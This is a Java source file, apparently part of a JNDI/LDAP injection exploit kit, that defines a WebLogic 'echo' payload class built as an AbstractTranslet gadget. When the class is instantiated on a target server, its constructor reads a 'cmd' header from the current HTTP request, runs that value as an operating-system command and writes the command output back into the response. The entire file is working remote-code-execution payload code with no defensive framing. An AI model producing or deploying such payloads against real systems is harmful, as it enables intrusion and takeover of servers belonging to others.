package com.feihong.ldap.template;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import weblogic.servlet.internal.ServletResponseImpl;
import weblogic.work.ExecuteThread;
import weblogic.work.WorkAdapter;
import weblogic.xml.util.StringInputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class WeblogicEchoTemplate extends AbstractTranslet {

    public WeblogicEchoTemplate(){
        try{
            WorkAdapter adapter = ((ExecuteThread)Thread.currentThread()).getCurrentWork();
            if(adapter.getClass().getName().endsWith("ServletRequestImpl")){
                String cmd = (String) adapter.getClass().getMethod("getHeader", String.class).invoke(adapter, "cmd");
                if(cmd != null && !cmd.isEmpty()){
                    String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                    ServletResponseImpl res = (ServletResponseImpl) adapter.getClass().getMethod("getResponse").invoke(adapter);
                    res.getServletOutputStream().writeStream(new StringInputStream(result));
                    res.getServletOutputStream().flush();
                    res.getWriter().write("");
                }
            }else{
                Field field = adapter.getClass().getDeclaredField("connectionHandler");
                field.setAccessible(true);
                Object obj = field.get(adapter);
                obj = obj.getClass().getMethod("getServletRequest").invoke(obj);
                String cmd = (String) obj.getClass().getMethod("getHeader", String.class).invoke(obj, "cmd");
                if(cmd != null && !cmd.isEmpty()){
                    String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                    ServletResponseImpl res = (ServletResponseImpl) obj.getClass().getMethod("getResponse").invoke(obj);
                    res.getServletOutputStream().writeStream(new StringInputStream(result));
                    res.getServletOutputStream().flush();
                    res.getWriter().write("");
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
